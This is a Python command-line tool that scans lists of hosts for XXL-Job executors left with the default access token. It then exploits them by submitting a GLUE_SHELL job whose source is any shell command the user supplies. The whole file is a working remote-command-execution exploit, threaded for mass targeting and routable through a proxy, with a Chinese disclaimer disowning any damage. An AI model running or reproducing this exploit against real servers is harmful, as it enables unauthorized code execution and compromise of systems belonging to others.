import requests
import argparse
import json
from concurrent.futures import ThreadPoolExecutor

ASCII_ART = r'''
 /$$   /$$ /$$   /$$ /$$                  /$$$$$  /$$$$$$  /$$$$$$$ 
| $$  / $$| $$  / $$| $$                 |__  $$ /$$__  $$| $$__  $$
|  $$/ $$/|  $$/ $$/| $$                    | $$| $$  \ $$| $$  \ $$
 \  $$$$/  \  $$$$/ | $$       /$$$$$$      | $$| $$  | $$| $$$$$$$ 
  >$$  $$   >$$  $$ | $$      |______/ /$$  | $$| $$  | $$| $$__  $$
 /$$/\  $$ /$$/\  $$| $$              | $$  | $$| $$  | $$| $$  \ $$
| $$  \ $$| $$  \ $$| $$$$$$$$        |  $$$$$$/|  $$$$$$/| $$$$$$$/
|__/  |__/|__/  |__/|________/         \______/  \______/ |_______/ 
  /$$$$$$                                                           
 /$$__  $$                                                          
| $$  \__/  /$$$$$$$  /$$$$$$  /$$$$$$$       Version: 1.0.0                   
|  $$$$$$  /$$_____/ |____  $$| $$__  $$                            
 \____  $$| $$        /$$$$$$$| $$  \ $$      Author:sys0ne                      
 /$$  \ $$| $$       /$$__  $$| $$  | $$                            
|  $$$$$$/|  $$$$$$$|  $$$$$$$| $$  | $$      me:https://github.com/lzhcxy                       
 \______/  \_______/ \_______/|__/  |__/                            
                                                         
'''
RED = "\033[31m"
RESET = "\033[0m"


description = f"{RED}免责声明：在使用本工具时造成对您自己或他人任何形式的损失和伤害，我们不承担任何责任{RESET}"

results = []  # 用于存储存在漏洞的目标

def exp(url, proxy=None, shell=None):
    proxies = {
        "http": proxy,
        "https": proxy
    } if proxy else None

    headers = {
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept-Encoding': 'gzip, deflate',
        'XXL-JOB-ACCESS-TOKEN': 'default_token',
        'Connection': 'close'
    }

    data = {
        "jobId": 1,
        "executorHandler": "demoJobHandler",
        "executorParams": "demoJobHandler",
        "executorBlockStrategy": "COVER_EARLY",
        "executorTimeout": 0,
        "logId": 1,
        "logDateTime": 1586629003729,
        "glueType": "GLUE_SHELL",
        "glueSource": shell or "default_shell",
        "glueUpdatetime": 1586699003758,
        "broadcastIndex": 0,
        "broadcastTotal": 0
    }

    try:
        response = requests.post(url=f"{url}/run", headers=headers, data=json.dumps(data), proxies=proxies, timeout=10)
        if response.status_code == 200 and ':200}' in response.text:
            results.append(url)
            print(f"[+] {url} 存在 xxl-job 默认 access_token 漏洞")
    except requests.exceptions.RequestException as e:
        pass


def load_targets(args):
    """加载目标地址列表"""
    ip_list = []
    if args.file:
        try:
            with open(args.file, 'r') as f:
                ip_list.extend(line.strip() for line in f if line.strip())
        except FileNotFoundError:
            print(f"Error: 文件 {args.file} 未找到")
            exit(1)

    ip_list.extend(args.ip)
    if not ip_list:
        print("未提供任何目标 IP 地址")
        exit(1)

    return [f"http://{ip}" if not ip.startswith(('http://', 'https://')) else ip for ip in ip_list]


def main():
    """主函数"""
    print(ASCII_ART)
    parser = argparse.ArgumentParser(description="XXL-Job 默认 token 漏洞检测工具")
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument('ip', nargs='*', help="目标 IP 地址或域名")
    parser.add_argument('-shell', type=str, help="要执行的 shell 命令")
    parser.add_argument('-f', '--file', help='包含目标地址的文件路径')
    parser.add_argument('-t', '--threads', type=int, default=10, help='并发线程数 (默认: 10)')
    parser.add_argument('--proxy', help='代理地址 (格式: http://127.0.0.1:8080)')

    args = parser.parse_args()

    # 加载目标
    targets = load_targets(args)
    print(f"加载目标数量: {len(targets)}，开始检测...\n")

    try:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            executor.map(lambda target: exp(target, proxy=args.proxy, shell=args.shell), targets)
    except KeyboardInterrupt:
        print("\n[!] 检测被中断，正在退出...")
        exit(1)

    print("\n检测完成！")
    print(f"存在漏洞的目标数量: {len(results)}")


if __name__ == '__main__':
    main()



